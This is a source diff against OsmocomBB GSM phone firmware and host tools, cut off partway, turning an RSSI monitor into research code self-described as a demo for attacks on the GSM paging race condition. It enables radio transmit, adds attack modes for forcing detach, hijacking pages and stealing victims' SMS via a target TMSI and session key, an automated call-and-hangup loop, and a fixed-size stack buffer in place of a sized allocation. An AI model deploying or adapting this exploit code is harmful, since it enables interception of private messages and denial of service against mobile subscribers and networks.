@@ -1,0 +1,2987 @@
+diff --git a/src/Makefile b/src/Makefile
+index cda880f..523b4fb 100644
+--- a/src/Makefile
++++ b/src/Makefile
+@@ -47,7 +47,7 @@ shared/libosmocore/build-target/Makefile: shared/libosmocore/configure shared/li
+ 			--host=$(CROSS_HOST) --enable-embedded --disable-shared \
+ 			--disable-tests ac_cv_header_sys_select_h=no \
+ 			--disable-tests ac_cv_header_sys_socket_h=no \
+-		CFLAGS="-Os -ffunction-sections -I$(TOPDIR)/target/firmware/include -nostartfiles -nodefaultlibs"
++		CFLAGS="-O3 -ffunction-sections -I$(TOPDIR)/target/firmware/include -nostartfiles -nodefaultlibs"
+ 
+ shared/libosmocore/build-target/src/.libs/libosmocore.a: shared/libosmocore/build-target/Makefile
+ 	cd shared/libosmocore/build-target && make
+--- a/src/host/layer23/src/misc/cell_log.c
++++ b/src/host/layer23/src/misc/cell_log.c
+@@ -185,10 +185,13 @@ static void log_sysinfo(void)
+ 	if (log_si.ta != 0xff)
+ 		sprintf(ta_str, " TA=%d", log_si.ta);
+ 
+-	LOGP(DSUM, LOGL_INFO, "Cell: ARFCN=%d MCC=%s MNC=%s (%s, %s)%s\n",
+-		arfcn, gsm_print_mcc(s->mcc), gsm_print_mnc(s->mnc),
++	LOGP(DSUM, LOGL_INFO, "Cell: ARFCN=%d LAC=%04x MCC=%s MNC=%s (%s, %s)%s\n",
++		arfcn, s->si3 ? s->lac : 0, gsm_print_mcc(s->mcc), gsm_print_mnc(s->mnc),
+ 		gsm_get_mcc(s->mcc), gsm_get_mnc(s->mcc, s->mnc), ta_str);
+ 
++	LOGFILE("Cell: ARFCN=%d LAC=%04x MCC=%s MNC=%s (%s, %s)%s\n",
++		arfcn, s->si3 ? s->lac : 0, gsm_print_mcc(s->mcc), gsm_print_mnc(s->mnc),
++		gsm_get_mcc(s->mcc), gsm_get_mnc(s->mcc, s->mnc), ta_str);
+ 	LOGFILE("[sysinfo]\n");
+ 	LOGFILE("arfcn %d\n", s->arfcn);
+ 	log_time();
+diff --git a/src/host/layer23/src/mobile/gsm48_cc.c b/src/host/layer23/src/mobile/gsm48_cc.c
+index 38dfab0..4adf18a 100644
+--- a/src/host/layer23/src/mobile/gsm48_cc.c
++++ b/src/host/layer23/src/mobile/gsm48_cc.c
+@@ -47,6 +47,10 @@ int mncc_release_ind(struct osmocom_ms *ms, struct gsm_trans *trans,
+ static int gsm48_cc_tx_disconnect(struct gsm_trans *trans, void *arg);
+ static int gsm48_cc_tx_connect_ack(struct gsm_trans *trans, void *arg);
+ 
++extern struct osmo_timer_list tick_timer_hangup;
++extern struct osmo_timer_list tick_timer_call;
++extern int calls;
++
+ /*
+  * init
+  */
+@@ -2167,8 +2171,10 @@ int gsm48_rcv_cc(struct osmocom_ms *ms, struct msgb *msg)
+ 		break;
+ 	case GSM48_MMCC_EST_CNF:
+ 		/* send setup after confirm */
+-		if (trans->cc.state == GSM_CSTATE_MM_CONNECTION_PEND)
++		if (trans->cc.state == GSM_CSTATE_MM_CONNECTION_PEND){
+ 			rc = gsm48_cc_tx_setup(trans);
++			osmo_timer_schedule(&tick_timer_hangup, 3, 700000);
++		}
+ 		else
+ 			LOGP(DCC, LOGL_ERROR, "Oops, MMCC-EST-CONF in state "
+ 				"%d?\n", trans->cc.state);
+diff --git a/src/host/layer23/src/mobile/gsm48_mm.c b/src/host/layer23/src/mobile/gsm48_mm.c
+index a8f699d..d9f719c 100644
+--- a/src/host/layer23/src/mobile/gsm48_mm.c
++++ b/src/host/layer23/src/mobile/gsm48_mm.c
+@@ -43,6 +43,10 @@
+ 
+ extern void *l23_ctx;
+ 
++extern int calls;
++extern struct osmo_timer_list tick_timer_call;
++extern struct osmo_timer_list tick_timer_hangup;
++
+ void mm_conn_free(struct gsm48_mm_conn *conn);
+ static int gsm48_rcv_rr(struct osmocom_ms *ms, struct msgb *msg);
+ static int gsm48_rcv_mmr(struct osmocom_ms *ms, struct msgb *msg);
+@@ -932,6 +936,8 @@ static void new_mm_state(struct gsm48_mmlayer *mm, int state, int substate)
+ 			vty_notify(ms, "On Network, normal service: %s, %s\n",
+ 				gsm_get_mcc(plmn->mcc),
+ 				gsm_get_mnc(plmn->mcc, plmn->mnc));
++				if(calls != 0)
++					osmo_timer_schedule(&tick_timer_call, 0, 5000);
+ 			break;
+ 		case GSM48_MM_SST_LIMITED_SERVICE:
+ 			vty_notify(ms, NULL);
+@@ -1451,7 +1457,7 @@ void mm_conn_free(struct gsm48_mm_conn *conn)
+ }
+ 
+ /* support function to release pending/all ongoing MM connections */
+-static int gsm48_mm_release_mm_conn(struct osmocom_ms *ms, int abort_any,
++int gsm48_mm_release_mm_conn(struct osmocom_ms *ms, int abort_any,
+ 				    uint8_t cause, int error, uint8_t sapi)
+ {
+ 	struct gsm48_mmlayer *mm = &ms->mmlayer;
+diff --git a/src/host/layer23/src/mobile/mnccms.c b/src/host/layer23/src/mobile/mnccms.c
+index 9fdc45f..58a3afa 100644
+--- a/src/host/layer23/src/mobile/mnccms.c
++++ b/src/host/layer23/src/mobile/mnccms.c
+@@ -41,6 +41,10 @@ static int dtmf_statemachine(struct gsm_call *call, struct gsm_mncc *mncc);
+ static void timeout_dtmf(void *arg);
+ int mncc_answer(struct osmocom_ms *ms);
+ 
++extern struct osmo_timer_list tick_timer_hangup;
++extern struct osmo_timer_list tick_timer_call;
++extern int calls;
++
+ /*
+  * support functions
+  */
+@@ -366,15 +370,16 @@ int mncc_recv_mobile(struct osmocom_ms *ms, int msg_type, void *arg)
+ 		vty_notify(ms, NULL);
+ 		if (data->cause.value == GSM48_CC_CAUSE_CALL_REJECTED)
+ 			vty_notify(ms, "Call has been rejected\n");
+-		else
+-			vty_notify(ms, "Call has been released\n");
++		else {
++			vty_notify(ms, "Call %d has been released\n", calls);
++		}
+ 		LOGP(DMNCC, LOGL_INFO, "Call has been released (cause %d)\n",
+ 			data->cause.value);
+ 		free_call(call);
+ 		break;
+ 	case MNCC_CALL_PROC_IND:
+ 		vty_notify(ms, NULL);
+-		vty_notify(ms, "Call is proceeding\n");
++		vty_notify(ms, "Call %d is proceeding\n", calls);
+ 		LOGP(DMNCC, LOGL_INFO, "Call is proceeding\n");
+ 		if ((data->fields & MNCC_F_BEARER_CAP)
+ 		 && data->bearer_cap.speech_ver[0] >= 0) {
+diff --git a/src/host/layer23/src/mobile/vty_interface.c b/src/host/layer23/src/mobile/vty_interface.c
+index dc9e09d..bd58100 100644
+--- a/src/host/layer23/src/mobile/vty_interface.c
++++ b/src/host/layer23/src/mobile/vty_interface.c
+@@ -49,10 +49,18 @@ int mncc_answer(struct osmocom_ms *ms);
+ int mncc_hold(struct osmocom_ms *ms);
+ int mncc_retrieve(struct osmocom_ms *ms, int number);
+ int mncc_dtmf(struct osmocom_ms *ms, char *dtmf);
++void vty_notify(struct osmocom_ms *ms, const char *fmt, ...);
+ 
+ extern struct llist_head ms_list;
+ extern struct llist_head active_connections;
+ 
++struct osmo_timer_list tick_timer_hangup;
++struct osmo_timer_list tick_timer_call;
++unsigned int timer_step = 0;
++static char *call_nr;
++int calls = 0;
++static struct vty *call_vty;
++
+ struct cmd_node ms_node = {
+ 	MS_NODE,
+ 	"%s(ms)#",
+@@ -753,6 +761,26 @@ DEFUN(network_select, network_select_cmd,
+ 	return CMD_SUCCESS;
+ }
+ 
++void call_tmsi(void *data){
++	struct osmocom_ms *ms;
++	ms = get_ms("1", call_vty);
++
++	if(calls == 0){
++		return;
++	}
++	vty_notify(ms, "new call");
++	mncc_call(ms, call_nr);
++	calls++;
++}
++
++void call_hangup(void *data){
++	struct osmocom_ms *ms;
++
++	ms = get_ms("1", call_vty);
++	vty_notify(ms, "hangup call");
++	gsm48_mm_release_mm_conn(ms, 1, 16, 0, 0);
++}
++
+ DEFUN(call, call_cmd, "call MS_NAME (NUMBER|emergency|answer|hangup|hold)",
+ 	"Make a call\nName of MS (see \"show ms\")\nPhone number to call "
+ 	"(Use digits '0123456789*#abc', and '+' to dial international)\n"
+@@ -764,6 +792,8 @@ DEFUN(call, call_cmd, "call MS_NAME (NUMBER|emergency|answer|hangup|hold)",
+ 	struct gsm_settings_abbrev *abbrev;
+ 	char *number;
+ 
++	calls = 0;
++
+ 	ms = get_ms(argv[0], vty);
+ 	if (!ms)
+ 		return CMD_WARNING;
+@@ -776,12 +806,17 @@ DEFUN(call, call_cmd, "call MS_NAME (NUMBER|emergency|answer|hangup|hold)",
+ 	}
+ 
+ 	number = (char *)argv[1];
++
+ 	if (!strcmp(number, "emergency"))
+ 		mncc_call(ms, number);
+ 	else if (!strcmp(number, "answer"))
+ 		mncc_answer(ms);
+ 	else if (!strcmp(number, "hangup"))
+ 		mncc_hangup(ms);
++	else if (!strcmp(number, "kill")){
++		calls = 0;
++		mncc_hangup(ms);
++	}
+ 	else if (!strcmp(number, "hold"))
+ 		mncc_hold(ms);
+ 	else {
+@@ -795,7 +830,17 @@ DEFUN(call, call_cmd, "call MS_NAME (NUMBER|emergency|answer|hangup|hold)",
+ 		}
+ 		if (vty_check_number(vty, number))
+ 			return CMD_WARNING;
++
++		if(calls == 0){
++			tick_timer_hangup.cb = &call_hangup;
++			tick_timer_hangup.data = &timer_step;
++			tick_timer_call.cb = &call_tmsi;
++			tick_timer_call.data = &timer_step;
++			call_nr = strdup(number);
++			call_vty = vty;
++		}
+ 		mncc_call(ms, number);
++		calls++;
+ 	}
+ 
+ 	return CMD_SUCCESS;
+diff --git a/src/host/osmocon/osmocon.c b/src/host/osmocon/osmocon.c
+index 66f2462..0268086 100644
+--- a/src/host/osmocon/osmocon.c
++++ b/src/host/osmocon/osmocon.c
+@@ -44,6 +44,7 @@
+ #include <osmocom/core/serial.h>
+ #include <osmocom/core/talloc.h>
+ #include <osmocom/core/timer.h>
++#include <time.h>
+ 
+ #include <arpa/inet.h>
+ 
+@@ -160,6 +161,7 @@ struct dnload {
+ 	int block_count;
+ 	int echo_bytecount;
+ 
++	struct tool_server tmsi_server;
+ 	struct tool_server layer2_server;
+ 	struct tool_server loader_server;
+ };
+@@ -717,6 +719,18 @@ static void hdlc_send_to_phone(uint8_t dlci, uint8_t *data, int len)
+ 
+ static void hdlc_console_cb(uint8_t dlci, struct msgb *msg)
+ {
++	char buf[40];
++	struct timeval tv;
++	struct tm *ptm;
++	long ms;
++
++	gettimeofday(&tv, NULL);
++	ptm = localtime(&tv.tv_sec);
++	strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", ptm);
++
++	ms = tv.tv_usec / 1000;
++	printf("%s.%03ld: ", buf, ms);
++	fflush(stdout);
+ 	write(1, msg->data, msg->len);
+ 	msgb_free(msg);
+ }
+@@ -1192,6 +1206,7 @@ static int parse_mode(const char *arg)
+ 	"[ -v | -h ] [ -d [t][r] ] [ -p /dev/ttyXXXX ]\n" \
+ 	"\t\t [ -s /tmp/osmocom_l2 ]\n" \
+ 	"\t\t [ -l /tmp/osmocom_loader ]\n" \
++	"\t\t [ -t /tmp/osmocom_mi ]\n" \
+ 	"\t\t [ -m {c123,c123xor,c140,c140xor,c155,romload,mtk} ]\n" \
+ 	"\t\t [ -c /to-be-chainloaded-file.bin ]\n" \
+ 	"\t\t [ -i beacon-interval (mS) ]\n" \
+@@ -1400,6 +1415,7 @@ int main(int argc, char **argv)
+ 	uint32_t tmp_load_address = ROMLOAD_ADDRESS;
+ 	const char *serial_dev = "/dev/ttyUSB1";
+ 	const char *layer2_un_path = "/tmp/osmocom_l2";
++	const char *tmsi_un_path = "/tmp/osmocom_mi";
+ 	const char *loader_un_path = "/tmp/osmocom_loader";
+ 
+ 	dnload.mode = MODE_C123;
+@@ -1407,7 +1423,7 @@ int main(int argc, char **argv)
+ 	dnload.previous_filename = NULL;
+ 	dnload.beacon_interval = DEFAULT_BEACON_INTERVAL;
+ 
+-	while ((opt = getopt(argc, argv, "d:hl:p:m:c:s:i:v")) != -1) {
++	while ((opt = getopt(argc, argv, "d:hl:p:m:c:s:t:i:v")) != -1) {
+ 		switch (opt) {
+ 		case 'p':
+ 			serial_dev = optarg;
+@@ -1417,6 +1433,9 @@ int main(int argc, char **argv)
+ 			if (dnload.mode == MODE_INVALID)
+ 				usage(argv[0]);
+ 			break;
++		case 't':
++			tmsi_un_path = optarg;
++			break;
+ 		case 's':
+ 			layer2_un_path = optarg;
+ 			break;
+@@ -1477,6 +1496,10 @@ int main(int argc, char **argv)
+ 				 SC_DLCI_L1A_L23) != 0)
+ 		exit(1);
+ 
++	if (register_tool_server(&dnload.tmsi_server, tmsi_un_path,
++				 SC_DLCI_TMSI) != 0)
++		exit(1);
++
+ 	if (register_tool_server(&dnload.loader_server, loader_un_path,
+ 				 SC_DLCI_LOADER) != 0)
+ 		exit(1);
+diff --git a/src/shared/libosmocore/src/gsm/gsm_utils.c b/src/shared/libosmocore/src/gsm/gsm_utils.c
+index 8d072a1..06a2be6 100644
+--- a/src/shared/libosmocore/src/gsm/gsm_utils.c
++++ b/src/shared/libosmocore/src/gsm/gsm_utils.c
+@@ -128,7 +128,7 @@ int gsm_7bit_decode_hdr(char *text, const uint8_t *user_data, uint8_t septet_l,
+ 	int i = 0;
+ 	int shift = 0;
+ 
+-	uint8_t *rtext = calloc(septet_l, sizeof(uint8_t));
++	uint8_t rtext[160];
+ 	uint8_t tmp;
+ 
+ 	/* skip the user data header */
+@@ -163,7 +163,6 @@ int gsm_7bit_decode_hdr(char *text, const uint8_t *user_data, uint8_t septet_l,
+ 	if (ud_hdr_ind)
+ 		i += shift;
+ 	*text = '\0';
+-	free(rtext);
+ 
+ 	return i;
+ }
+diff --git a/src/target/firmware/Makefile b/src/target/firmware/Makefile
+index a71eef6..c3d569c 100644
+--- a/src/target/firmware/Makefile
++++ b/src/target/firmware/Makefile
+@@ -99,7 +99,7 @@ ANY_APP_LIBS+=calypso/libcalypso.a layer1/liblayer1.a lib/libmini.a comm/libcomm
+ -include Makefile.inc
+ 
+ # Uncomment this line if you want to enable Tx (Transmit) Support.
+-#CFLAGS += -DCONFIG_TX_ENABLE
++CFLAGS += -DCONFIG_TX_ENABLE
+ 
+ # Uncomment this line if you want to write to flash.
+ #CFLAGS += -DCONFIG_FLASH_WRITE
+diff --git a/src/target/firmware/apps/rssi/main.c b/src/target/firmware/apps/rssi/main.c
+index 7d10e1c..de869b9 100644
+--- a/src/target/firmware/apps/rssi/main.c
++++ b/src/target/firmware/apps/rssi/main.c
+@@ -1,6 +1,7 @@
+-/* Cell Monitor of Free Software for Calypso Phone */
+-
+-/* (C) 2012 by Andreas Eversberg <jolly@eversberg.eu>
++/* (C) 2012 by Andreas Eversberg <jolly@eversberg.eu> (original RSSI code)
++ * (C) 2012-2013 by Nico Golde <nico@sec.t-labs.tu-berlin.de>
++ * demo code for attacks exploiting the race condition in GSM paging
++ * originally based on rssi application by Andreas Eversberg
+  *
+  * All Rights Reserved
+  *
+@@ -22,6 +23,7 @@
+ 
+ #include <stdint.h>
+ #include <stdio.h>
++#include <stdlib.h>
+ #include <string.h>
+ #include <errno.h>
+ 
+@@ -38,9 +40,9 @@
+ #include <calypso/tpu.h>
+ #include <calypso/tsp.h>
+ #include <calypso/dsp.h>
++#include <battery/battery.h>
+ #include <calypso/irq.h>
+ #include <calypso/misc.h>
+-#include <calypso/buzzer.h>
+ #include <comm/sercomm.h>
+ #include <comm/timer.h>
+ #include <fb/framebuffer.h>
+@@ -49,15 +51,25 @@
+ #include <layer1/l23_api.h>
+ #include <osmocom/gsm/rsl.h>
+ #include <osmocom/gsm/protocol/gsm_04_08.h>
++#include <osmocom/gsm/protocol/gsm_04_11.h>
+ #include <osmocom/gsm/gsm48_ie.h>
+-#include <battery/battery.h>
++#include <osmocom/gsm/gsm48.h>
++
+ 
++/*
++#define printf(x, ...) 0
++*/
+ enum key_codes key_code = KEY_INV;
+ int key_pressed = 0;
+ enum key_codes key_pressed_code;
+ unsigned long key_pressed_when;
+ unsigned int key_pressed_delay;
+ 
++
++#define GSM_CIPHER_A5_1         1
++#define GSM_CIPHER_A5_2         2
++#define GSM_CIPHER_A5_3         3
++
+ enum mode {
+ 	MODE_MAIN,
+ 	MODE_SPECTRUM,
+@@ -67,7 +79,23 @@ enum mode {
+ } mode = MODE_MAIN;
+ enum mode last_mode; /* where to return after entering ARFCN */
+ 
+-static uint16_t arfcn = 0, ul_arfcn;
++enum attack_mode {
++	MODE_DETACH,
++	MODE_PAGING,
++	MODE_RANGE_PAGING,
++	MODE_ALL_PAGING,
++	MODE_STEAL_SMS,
++	MODE_NONE
++} attack_mode = MODE_NONE;
++
++enum cipher_mode {
++	CIPHER_NONE,
++	CIPHER_ACTIVE
++} cipher_mode = CIPHER_NONE;
++
++uint8_t key_seq = 0;
++
++static uint16_t arfcn = 549, ul_arfcn;
+ int pcs = 0;
+ int uplink = 0;
+ int max = 0;
+@@ -75,6 +103,8 @@ uint8_t power, max_power;
+ char input[5];
+ int cursor;
+ 
++
++uint8_t timing_advance;
+ char *sync_result = NULL;
+ char *sync_msg = "";
+ 
+@@ -89,6 +119,12 @@ static struct band {
+ 
+ struct band *band;
+ 
++uint8_t victim_tmsi[] = "\xff\xff\xff\xff";
++uint8_t kc[] = "\xff\xff\xff\xff\xff\xff\xff\xff";
++int tmsi_range_min = -1;
++int tmsi_range_max = -1;
++int foo=0;
++
+ #define PCS_MIN 512
+ #define PCS_MAX 810
+ #define DCS_MIN 512
+@@ -96,6 +132,16 @@ struct band *band;
+ #define PCS_UL 18502
+ #define PCS_DL 19302
+ 
++#define L3_ALLOC_SIZE 256
++#define L3_ALLOC_HEADROOM 64
++
++enum sms_mode {
++	SMS_CP_DATA,
++	SMS_CP_ACK,
++	SMS_RP_ACK,
++	SMS_NONE
++};
++
+ enum pm_mode {
+ 	PM_IDLE,
+ 	PM_SENT,
+@@ -112,10 +158,6 @@ int pm_max = 2;
+ uint8_t pm_spectrum[1024];
+ int pm_scale = 1; /* scale measured power level */
+ 
+-#define TONE_JIFFIES ((HZ < 25) ? 1 : HZ / 25)
+-int tone = 0;
+-unsigned long tone_time;
+-int tone_on = 0;
+ 
+ uint8_t bsic;
+ uint8_t ul_levels[8], ul_max[8]; /* 8 uplink levels */
+@@ -127,7 +169,7 @@ uint8_t si_3[23];
+ uint8_t si_4[23];
+ uint16_t si_new = 0, ul_new;
+ uint16_t mcc, mnc, lac, cell_id;
+-int ccch_conf;
++int ccch_conf = -1;
+ int nb_num;
+ struct gsm_sysinfo_freq freq[1024];
+ #define NEIGH_LINES	((framebuffer->height - 25) / 8)
+@@ -138,12 +180,89 @@ struct gsm_sysinfo_freq freq[1024];
+ #define FREQ_TYPE_NCELL_2bis	0x08 /* sub channel of SI 2bis */
+ #define FREQ_TYPE_NCELL_2ter	0x10 /* sub channel of SI 2ter */
+ 
++#define LAPDm_ADDR(lpd, sapi, cr) ((((lpd) & 0x3) << 5) | (((sapi) & 0x7) << 2) | (((cr) & 0x1) << 1) | 0x1)
++#define LAPDm_CTRL_U(u, p)  ((((u) & 0x1c) << (5-2)) | (((p) & 0x1) << 4) | (((u) & 0x3) << 2) | 0x3)
++#define LAPDm_LEN(len)      ((len << 2) | 0x1)
++#define LAPDm_CTRL_S(nr, s, p)       ((((nr) & 0x7) << 5) | (((p) & 0x1) << 4) | (((s) & 0x3) << 2) | 0x1)
++#define LAPDm_CTRL_I(nr, ns, p)      ((((nr) & 0x7) << 5) | (((p) & 0x1) << 4) | (((ns) & 0x7) << 1))
++
++#define LAPDm_CTRL_is_I(ctrl)   (((ctrl) & 0x1) == 0)
++#define LAPDm_CTRL_is_S(ctrl)   (((ctrl) & 0x3) == 1)
++#define LAPDm_CTRL_is_U(ctrl)   (((ctrl) & 0x3) == 3)
++
++#define LAPDm_CTRL_U_BITS(ctrl) ((((ctrl) & 0xC) >> 2) | ((ctrl) & 0xE0) >> 3)
++#define LAPDm_CTRL_PF_BIT(ctrl) (((ctrl) >> 4) & 0x1)
++
++#define LAPDm_CTRL_S_BITS(ctrl) (((ctrl) & 0xC) >> 2)
++
++#define LAPDm_CTRL_I_Ns(ctrl)   (((ctrl) & 0xE) >> 1)
++#define LAPDm_CTRL_Nr(ctrl)     (((ctrl) & 0xE0) >> 5)
++
++#define LAPDm_ADDR_SAPI(addr) (((addr) >> 2) & 0x7)
++#define LAPDm_ADDR_CR(addr) (((addr) >> 1) & 0x1)
++#define LAPDm_ADDR_EA(addr) ((addr) & 0x1)
++
++
++/* TS 04.06 Table 4 / Section 3.8.1 */
++#define LAPDm_U_SABM    0x7
++#define LAPDm_U_DM      0x3
++#define LAPDm_U_UI      0x0
++#define LAPDm_U_DISC    0x8
++#define LAPDm_U_UA      0xC
++
++#define LAPDm_S_RR      0x0
++#define LAPDm_S_RNR     0x1
++#define LAPDm_S_REJ     0x2
++
++#define LAPD_S_RR       0x0
++#define LAPD_S_RNR      0x1
++#define LAPD_S_REJ      0x2
++
++#define LAPDm_LPD_NORMAL  0
++
++#define CR_MS2BS_CMD      0
++#define CR_MS2BS_RESP     1
++
++#define LAPD_U_SABM     0x7
++#define LAPD_U_SABME    0xf
++#define LAPD_U_DM       0x3
++#define LAPD_U_UI       0x0
++#define LAPD_U_DISC     0x8
++#define LAPD_U_UA       0xC
++#define LAPD_U_FRMR     0x11
++
++#define LAPDm_SAPI_0 0x0
++#define LAPDm_SAPI_3 0x3
++
++struct _lapd_state {
++	uint8_t v_recv;
++	uint8_t v_send;
++	uint8_t v_ack;
++	uint8_t sapi;
++	uint8_t active;
++	uint8_t ui_count;
++	uint8_t ciph_count;
++} lapd_state; 
++
++struct _sms_state {
++	uint8_t cp_user_length;
++	uint8_t rp_data_length;
++	uint8_t sms_mode;
++	int skip;
++	char text[256];
++} sms_state;
++
++
+ int rach = 0;
+ struct gsm48_req_ref rach_ref;
+ uint8_t rach_ra;
+ unsigned long rach_when;
++unsigned long last_net_frame;
+ uint8_t ta;
+ 
++uint8_t v_r;
++uint8_t v_a;
++
+ enum assign {
+ 	ASSIGN_NONE,
+ 	ASSIGN_NO_TX,
+@@ -152,7 +271,10 @@ enum assign {
+ 	ASSIGN_TIMEOUT,
+ } assign;
+ 
++struct llist_head mi_queue;
++
+ /* UI */
++static int tmsi_match(uint8_t *mi, uint8_t *tmsi);
+ 
+ static void print_display(char *text, int *y, int c)
+ {
+@@ -168,10 +290,40 @@ static void print_display(char *text, int *y, int c)
+ 	fb_putstr(text, framebuffer->width);
+ }
+ 
++static void init_lapdm(void){
++	memset(&lapd_state, 0, sizeof(lapd_state));
++	memset(&sms_state, 0, sizeof(sms_state));
++	sms_state.skip = -1;
++	lapd_state.active = 1;
++}
++
++static inline uint8_t inc_mod(uint8_t x, uint8_t m){
++	return (x + 1) & (m - 1);
++}
++
++static void enter_sync(void);
++static void exit_sync(void);
++static void disable_ciphering(void);
++static void toggle_dcs_pcs(void);
++
++static void reenter_sync(void){
++	if(attack_mode == MODE_STEAL_SMS){
++		disable_ciphering();
++	}
++	exit_sync();
++	/* why do we need this, what is the problem if we dont switch the arfcn? */
++	toggle_dcs_pcs();
++	enter_sync();
++}
++
++static void update_net_frame(void){
++	last_net_frame = jiffies;
++}
++
+ static void refresh_display(void)
+ {
+ 	char text[16];
+-	int bat = battery_info.battery_percent;
++	int bat = 100;
+ 
+ 	fb_clear();
+ 
+@@ -181,12 +333,23 @@ static void refresh_display(void)
+ 		fb_setfg(FB_COLOR_BLUE);
+ 		fb_setfont(FB_FONT_HELVR08);
+ 		fb_gotoxy(0, 7);
+-		fb_putstr("Osmocom RSSI", -1);
++		if(attack_mode == MODE_DETACH){
++			fb_putstr(" [D]PAGFuN", -1);
++		} else if (attack_mode == MODE_STEAL_SMS) {
++			fb_putstr(" [SM]PAGFuN", -1);
++		} else if (attack_mode == MODE_PAGING) {
++			fb_putstr(" [P]PAGFuN", -1);
++		} else if (attack_mode == MODE_RANGE_PAGING) {
++			fb_putstr(" [RP]PAGFuN", -1);
++		} else if (attack_mode == MODE_ALL_PAGING) {
++			fb_putstr(" [AP]PAGFuN", -1);
++		} else {
++			fb_putstr(" [N]PAGFuN", -1);
++		}
+ 		fb_setfg(FB_COLOR_RGB(0xc0, 0xc0, 0x00));
+ 		fb_setfont(FB_FONT_SYMBOLS);
+ 		fb_gotoxy(framebuffer->width - 15, 8);
+-		if (bat >= 100 && (battery_info.flags & BATTERY_CHG_ENABLED)
+-		 && !(battery_info.flags & BATTERY_CHARGING))
++		if (bat >= 100)
+ 			fb_putstr("@HHBC", framebuffer->width);
+ 		else {
+ 			sprintf(text, "@%c%c%cC", (bat >= 30) ? 'B':'A',
+@@ -294,46 +457,50 @@ static void refresh_display(void)
+ 	/* SYNC / SI */
+ 	if (mode == MODE_SYNC && cursor == 0) {
+ 		fb_gotoxy(0, 20);
+-		if (sync_msg[0] == 'o')
+-			sprintf(text, "BSIC%d/%d %4d", bsic >> 3, bsic & 7,
+-				power - 110);
+-		else
+-			sprintf(text, "Sync %s", sync_msg);
+-		fb_putstr(text, -1);
+-
+-		fb_gotoxy(0,28);
+-		text[0] = si_1[2] ? '1' : '-';
+-		text[1] = ' ';
+-		text[2] = si_2[2] ? '2' : '-';
+-		text[3] = ' ';
+-		text[4] = si_2bis[2] ? '2' : '-';
+-		text[5] = si_2bis[2] ? 'b' : ' ';
+-		text[6] = si_2ter[2] ? '2' : '-';
+-		text[7] = si_2ter[2] ? 't' : ' ';
+-		text[8] = ' ';
+-		text[9] = si_3[2] ? '3' : '-';
+-		text[10] = ' ';
+-		text[11] = si_4[2] ? '4' : '-';
+-		text[12] = '\0';
+-		fb_putstr(text, -1);
+-
+-		fb_gotoxy(0, 36);
+-		fb_putstr("MCC MNC LAC ", -1);
+-		fb_gotoxy(0, 44);
+-		if (mcc) {
+-			if ((mnc & 0x00f) == 0x00f)
+-				sprintf(text, "%3x %02x  %04x", mcc, mnc >> 4, lac);
++		if(sms_state.text[0] != 0){
++			fb_putstr(sms_state.text, -1);
++		} else {
++			if (sync_msg[0] == 'o')
++				sprintf(text, "BSIC%d/%d %4d", bsic >> 3, bsic & 7,
++					power - 110);
+ 			else
+-				sprintf(text, "%3x %03x %04x", mcc, mnc, lac);
++				sprintf(text, "Sync %s", sync_msg);
+ 			fb_putstr(text, -1);
+-		} else
+-			fb_putstr("--- --- ----", -1);
+-		fb_gotoxy(0, 52);
+-		if (si_3[2]) {
+-			sprintf(text, "cell id:%04x", cell_id);
++
++			fb_gotoxy(0,28);
++			text[0] = si_1[2] ? '1' : '-';
++			text[1] = ' ';
++			text[2] = si_2[2] ? '2' : '-';
++			text[3] = ' ';
++			text[4] = si_2bis[2] ? '2' : '-';
++			text[5] = si_2bis[2] ? 'b' : ' ';
++			text[6] = si_2ter[2] ? '2' : '-';
++			text[7] = si_2ter[2] ? 't' : ' ';
++			text[8] = ' ';
++			text[9] = si_3[2] ? '3' : '-';
++			text[10] = ' ';
++			text[11] = si_4[2] ? '4' : '-';
++			text[12] = '\0';
+ 			fb_putstr(text, -1);
+-		} else
+-			fb_putstr("cell id:----", -1);
++
++			fb_gotoxy(0, 36);
++			fb_putstr("MCC MNC LAC ", -1);
++			fb_gotoxy(0, 44);
++			if (mcc) {
++				if ((mnc & 0x00f) == 0x00f)
++					sprintf(text, "%3x %02x  %04x", mcc, mnc >> 4, lac);
++				else
++					sprintf(text, "%3x %03x %04x", mcc, mnc, lac);
++				fb_putstr(text, -1);
++			} else
++				fb_putstr("--- --- ----", -1);
++			fb_gotoxy(0, 52);
++			if (si_3[2]) {
++				sprintf(text, "cell id:%04x", cell_id);
++				fb_putstr(text, -1);
++			} else
++				fb_putstr("cell id:----", -1);
++		}
+ 	}
+ 
+ 	/* SYNC / neighbour cells */
+@@ -434,66 +601,6 @@ static void refresh_display(void)
+ 		fb_setbg(FB_COLOR_WHITE);
+ 	}
+ 
+-	/* spectrum */
+-	if (mode == MODE_SPECTRUM) {
+-		int i;
+-		uint16_t a, e, p;
+-		int height = framebuffer->height - 25;
+-
+-		fb_gotoxy(0, 8);
+-		if (pcs && arfcn >= PCS_MIN && arfcn <= PCS_MAX)
+-			sprintf(text, "%4dP", arfcn);
+-		else if (arfcn >= DCS_MIN && arfcn <= DCS_MAX)
+-			sprintf(text, "%4dD", arfcn);
+-		else
+-			sprintf(text, "%4d ", arfcn);
+-		sprintf(text + 5, "   %4d", pm_spectrum[arfcn & 1023] - 110);
+-		fb_putstr(text, -1);
+-		fb_setfg(FB_COLOR_RED);
+-		if (max) {
+-			fb_setfont(FB_FONT_HELVR08);
+-			fb_gotoxy(framebuffer->width - 16,15);
+-			fb_putstr("max", framebuffer->width);
+-			fb_setfont(FB_FONT_C64);
+-		}
+-		if (pm_scale != 1) {
+-			fb_setfont(FB_FONT_HELVR08);
+-			fb_gotoxy(1, 15);
+-			sprintf(text, "x%d", pm_scale);
+-			fb_putstr(text, framebuffer->width);
+-			fb_setfont(FB_FONT_C64);
+-		}
+-		fb_setfg(FB_COLOR_BLACK);
+-		if (pcs && arfcn >= PCS_MIN && arfcn <= PCS_MAX) {
+-			a = PCS_MIN;
+-			e = PCS_MAX;
+-		} else {
+-			a = band->min;
+-			e = band->max;
+-		}
+-		for (i = 0; i < framebuffer->width; i++) {
+-			p = (arfcn + i - (framebuffer->width >> 1)) & 1023;
+-			if ((((p - a) & 1023) & 512))
+-				continue;
+-			if ((((e - p) & 1023) & 512))
+-				continue;
+-			p = (pm_spectrum[p] * pm_scale * height / 64);
+-			if (p > height)
+-				p = height;
+-			if (i == (framebuffer->width >> 1))
+-				fb_setfg(FB_COLOR_RED);
+-			fb_gotoxy(i, height + 10 - p);
+-			fb_boxto(i, height + 10);
+-			if (i == (framebuffer->width >> 1))
+-				fb_setfg(FB_COLOR_BLACK);
+-		}
+-		i = framebuffer->width >> 1;
